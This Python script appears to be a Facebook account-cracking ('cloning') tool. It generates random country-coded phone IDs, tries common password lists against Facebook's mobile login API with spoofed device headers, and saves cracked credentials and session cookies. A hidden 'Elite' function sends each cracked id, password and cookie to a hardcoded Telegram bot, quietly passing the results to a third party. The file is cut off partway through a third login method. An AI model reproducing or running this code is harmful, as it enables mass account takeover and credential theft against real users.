from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
import os,base64,zlib,pip,urllib
print("\x1b[37m[\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \x1b[37m")
print("\x1b[37m[\u001b[36m•\033[1;37m] UPDATES DONE \x1b[37m")

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python sandip.py')
except:pass
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2


try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
    
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;32m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;32m| \33[1;32m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;32m| \33[1;32m2010\33[1;32m/\33[1;32m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;32m| \33[1;32m2011\33[1;32m/\33[1;32m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;32m| \33[1;32m2012\33[1;32m/\33[1;32m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;32m| \33[1;32m2013\33[1;32m/\33[1;32m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;32m| \33[1;3wm2014\33[1;32m/\33[1;32m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;32m| \33[1;32m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;32m| \33[1;32m2015\33[1;32m/\33[1;32m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;32m| \33[1;32m2016\33[1;32m/\33[1;32m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;32m| \33[1;32m2018\33[1;32m/\33[1;32m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;32m| \33[1;32m2019\33[1;32m/\33[1;32m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;32m| \33[1;32m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;32m| \33[1;32m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;32m| \33[1;32m2022' 
        elif ids[:5] in ['10009']           :creation = '\32[1;32m| \32[1;33m2022\32[1;32m/\32[1;32m2023'
        elif ids[:4] in ['6155']           :creation = '\32[1;32m| \32[1;32m2023' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;32m| \33[1;32m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;32m| \33[1;32m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;32m| \33[1;32m2006/2007'
    else:creation=''
    return creation

def Elite(ids,pas,coki):
    try:
        import requests
        token = "6692878144:AAE5BPWGtKG8KfpVWm6SjboRBNk517dtTNM"
        chatid = "5143946468"
        ok_id =str(ids+"|"+pas+"|"+cookie)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
logo=("""\033[1;37m   _____                 ___                 
  / ___/____ _____  ____/ (_)___  ___  __  __
  \__ \/ __ `/ __ \/ __  / / __ \/ _ \/ / / /
 ___/ / /_/ / / / / /_/ / / /_/ /  __/ /_/ / 
/____/\__,_/_/ /_/\__,_/_/ .___/\___/\__, /  
                        /_/         /____/\033[1;36m1.2.6\033[1;37m
-----------------------------------------------
 \x1b[37m[\u001b[36m•\033[1;37m] OWNER   :  SANDIP GURUNG
 \x1b[37m[\u001b[36m•\033[1;37m] GITHUB  :  SANDIP-GURUNG
-----------------------------------------------""")
def linex():
        print('\033[1;37m-----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]

def menu():
                        clear()	
                        print(' \x1b[37m[\u001b[36m1\033[1;37m] File cloning\n \x1b[37m[\u001b[36m2\033[1;37m] Create file\n \x1b[37m[\u001b[36m3\033[1;37m] Random cloning\n \x1b[37m[\u001b[36m4\033[1;37m] Random gmail crack (Soon..)\n \x1b[37m[\u001b[36m5\033[1;37m] WhatsApp Group (Join)\n \x1b[37m[\u001b[36m0\033[1;37m] Exit')
                        linex()
                        xd=input(' Choose an option : ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example: /sdcard/sandipeyy.txt etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' Every methods are working')
                                linex()
                                print(' \x1b[37m[\u001b[36m1\033[1;37m] Method 1 \n \x1b[37m[\u001b[36m2\033[1;37m] Method 2 \n \x1b[37m[\u001b[36m3\033[1;37m] Method 3 ')
                                linex()
                                mthd=input(' Choose : ')
                                linex()
                                plist = []
                                print(" \x1b[37m[\u001b[36m1\033[1;37m] Auto Password \n \x1b[37m[\u001b[36m2\033[1;37m] Choice Password ")                                
                                linex()
                                psx=input(' Choose : ')
                                if psx in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('first1234')
                                        plist.append('first123456')
                                        plist.append('firstlast123')
                                        plist.append("last123456789")
                                        plist.append('firstlast123')
                                        plist.append('nepal@123')
                                        plist.append('first@#')
                                        plist.append("last12345")
                                        plist.append('first@123')
                                        plist.append('First123')
                                        plist.append('First@12345')
                                        plist.append("@last12345")
                                        plist.append('Nepal@123')
                                        plist.append('first@1234567')
                                        plist.append('@first123')
                                        plist.append('i love you')                                        
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' Password {i+1}: '))
                                linex()
                                print(' Would you like to display the CP account? (y/n): ')
                                linex()
                                cx=input(' Choose : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' TOTAL IDZ TO SCAN : \033[1;36m'+total_ids)
                                        print(" \033[1;37mYOU STARTED CLONING AT : \033[1;36m"+time.strftime("%H:%M")+" "+ tag)
                                        print(" \033[1;37mFLIGHT MODE USE HANN BHAII")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M2,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(M3,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python sandip.py')
                        elif xd in ['2','02']:                               
                                print("soon...")
                        elif xd in ['3','03']:
                                clear()
                                print('  \x1b[37m[\u001b[36m1\033[1;37m]  Pakistan cloning\n  \x1b[37m[\u001b[36m2\033[1;37m]  Bangladesh cloning\n  \x1b[37m[\u001b[36m3\033[1;37m]  Nepal India cloning\n  \x1b[37m[\u001b[36m0\033[1;37m]  Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        npxind()                              
                                else:
                                        menu()
                        elif xd in ['4','04']:
                                gmail()
                        elif xd in ['5','05']:
                                wx=('xxdd')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')

def npxind():
                user=[]
                clear()
                print('\033[1;37m Example : ,9816,9806,ETC')
                linex()
                print(" Put your country 4digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print('  \x1b[37m[\u001b[36m1\033[1;37m]  Method  \033[1;32m \n  \x1b[37m[\u001b[36m2\033[1;37m]  \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                
                print(" Select your country password method")
                linex()
                print(" \x1b[37m[\u001b[36m1\033[1;37m]  India password method ")
                print(" \x1b[37m[\u001b[36m2\033[1;37m]  Nepal password method ")
                linex()
                pcs = input("choose : ")
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(6))
                        user.append(nmp)
                with tred(max_workers=30) as SANDIPEYY:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                if pcs in ['1','01']:                                   
                                    passlist = [psx,ids,'meena123','57575751','57273200','manish123','manish1234','sharma123','i love you','iloveyou','viratkohli','bhagwan','pubglover','pubg1122']
                                elif pcs in ['2','02']:     
                                    passlist = [psx,ids,'nepal123','nepal1234','nepal@123','sagar123','i love you','freefire','pubghero','free fire','kathmandu','kathmandu123','sagarmatha123','machikney123']                             
                                if mthd in ['1','01']:                                 
                                    SANDIPEYY.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    SANDIPEYY.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python sandip.py')    
                
def pak():
                user=[]
                clear()
                print('\033[1;37m Example : ,0300,ETC')
                linex()
                print(" Put your country 4digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print('  \x1b[37m[\u001b[36m1\033[1;37m]  Method  \033[1;32m \n  \x1b[37m[\u001b[36m2\033[1;37m]  \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SANDIPEYY:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','maryam123','khanking','baloch','peshawar','pubg1122']
                                if mthd in ['1','01']:                                 
                                    SANDIPEYY.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    SANDIPEYY.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python sandip.py')       
def bd():
                user=[]
                clear()
                print('\033[1;37m Example : ,019,ETC')
                linex()
                print(" Put your country 3digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print('  \x1b[37m[\u001b[36m1\033[1;37m]  Method  \033[1;32m \n  \x1b[37m[\u001b[36m2\033[1;37m]  \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as SANDIPEYY:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                if mthd in ['1','01']:                                 
                                    SANDIPEYY.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    SANDIPEYY.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python sandip.py') 
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as SANDIPEYY:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                SANDIPEYY.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python sandip.py')
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SANDIPEYY-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-A305FN;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"ex_MX","client_country_code":"MX",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [SANDIPEYY-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        open('/sdcard/Sandipeyy_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SANDIPEYY_IDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SANDIPEYY-2F] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\x1b[1;93m[SANDIPEYY-CP] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                                open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                Elite(ids,pas,coki)
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SANDIPEYY-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3771;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"en_US","client_country_code":"US",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [SANDIPEYY-OK] '+ids+' | '+pas+' | '+joined(ids)+'\033[1;97m')
                                        open('/sdcard/m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,coki)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SANDIPEYY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\x1b[1;93m [SANDIPEYY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/brand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SANDIPEYY-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[0]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
